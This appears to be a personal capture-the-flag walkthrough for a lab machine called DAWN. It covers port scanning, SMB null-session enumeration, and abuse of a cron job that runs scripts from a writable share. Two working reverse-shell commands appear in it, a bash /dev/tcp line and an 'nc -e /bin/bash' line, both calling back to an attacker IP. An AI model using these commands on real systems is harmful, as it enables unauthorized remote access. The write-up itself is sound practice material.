Linux ttl=61
# rustscan

```
scan 192.168.214.11
```

```
PORT     STATE SERVICE      REASON
80/tcp   open  http         syn-ack ttl 61
139/tcp  open  netbios-ssn  syn-ack ttl 61
445/tcp  open  microsoft-ds syn-ack ttl 61
3306/tcp open  mysql        syn-ack ttl 61

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.39 seconds
           Raw packets sent: 8 (328B) | Rcvd: 5 (204B)
```

# nmap

```
sudo nmap -sS -Pn -T4 -sCV -O -A -p80,139,445,3306 192.168.214.11
```

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-09 06:15 EDT
Nmap scan report for 192.168.214.11
Host is up (0.12s latency).

PORT     STATE SERVICE     VERSION
80/tcp   open  http        Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
3306/tcp open  mysql       MySQL 5.5.5-10.3.15-MariaDB-1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.15-MariaDB-1
|   Thread ID: 19
|   Capabilities flags: 63486
|   Some Capabilities: ConnectWithDatabase, Support41Auth, Speaks41ProtocolOld, LongColumnFlag, FoundRows, InteractiveClient, SupportsLoadDataLocal, DontAllowDatabaseTableColumn, ODBCClient, Speaks41ProtocolNew, IgnoreSigpipes, SupportsTransactions, IgnoreSpaceBeforeParenthesis, SupportsCompression, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: P)xF1`q8cifBYvg!l~Tf
|_  Auth Plugin Name: mysql_native_password
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.4 (90%), Linux 4.9 (90%), Linux 3.10 - 3.12 (89%), Linux 4.0 (88%), Linux 3.10 (87%), Linux 3.10 - 3.16 (87%), Linux 2.6.18 (87%), Linux 3.10 - 4.11 (87%), Linux 3.11 - 4.1 (87%), Linux 3.18 (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Host: DAWN

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2024-06-09T10:15:23
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: dawn
|   NetBIOS computer name: DAWN\x00
|   Domain name: dawn
|   FQDN: dawn.dawn
|_  System time: 2024-06-09T06:15:20-04:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 1h20m01s, deviation: 2h18m34s, median: 0s

TRACEROUTE (using port 139/tcp)
HOP RTT       ADDRESS
1   301.52 ms 192.168.45.1
2   301.48 ms 192.168.45.254
3   301.54 ms 192.168.251.1
4   301.58 ms 192.168.214.11

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.63 seconds

```


# initial

Only interesting port is `smb` as there was nothing interesting on web

![[Pasted image 20240610012719.png]]

### dir busting

started dir busting in background and found `/logs`

![[Pasted image 20240610012816.png]]

`management.log` is interesting here

### smb null

```
nxc smb 192.168.240.11 --shares -u "" -p ""
```

![[Pasted image 20240610012953.png]]

```
smbmap -H 192.168.240.11  
```

![[Pasted image 20240610013004.png]]

```
nmap -p139,445 --script=smb-enum-shares 192.168.240.11
```

![[Pasted image 20240610013045.png]]

### cron job

from management.log I found about cron job which is calling `web-control` and `product-control` from ITDEPT share so I put those both file in that share with rev shell and got that

```
echo "bash -c '/bin/bash -i >& /dev/tcp/192.168.45.221/4444 0>&1'" >> product-control
```

```
echo 'nc 192.168.45.221 4444 -e /bin/bash' >> web-control   
```


### priv esc

easy-peasy

checked SUID and found `zsh` is there